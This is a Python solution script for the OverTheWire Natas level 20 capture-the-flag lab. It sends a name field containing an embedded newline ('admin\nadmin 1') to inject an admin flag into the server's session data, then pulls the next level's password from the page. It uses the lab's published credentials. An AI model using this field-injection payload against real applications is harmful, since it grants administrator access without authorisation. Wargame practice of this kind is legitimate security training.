# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
from urllib.parse import quote
import requests

def natas20():
    username="natas20"
    password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
    name = "admin\nadmin 1"
    data = {"name":name}
    session = requests.Session()
    url = "http://natas20.natas.labs.overthewire.org/"
    response = session.post(url+f"?debug", auth=(username, password), data=data)
    # both works
    # response = session.get(url+f"?debug&name={quote(name)}", auth=(username, password))
    cookies = session.cookies.get_dict()
    response = session.get(url+"?debug", auth=(username, password), cookies=cookies)
    content = response.content.decode("utf-8")
    password = re.search(r"(?<=Password: )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))
    return
    

if __name__ == "__main__":
    natas20()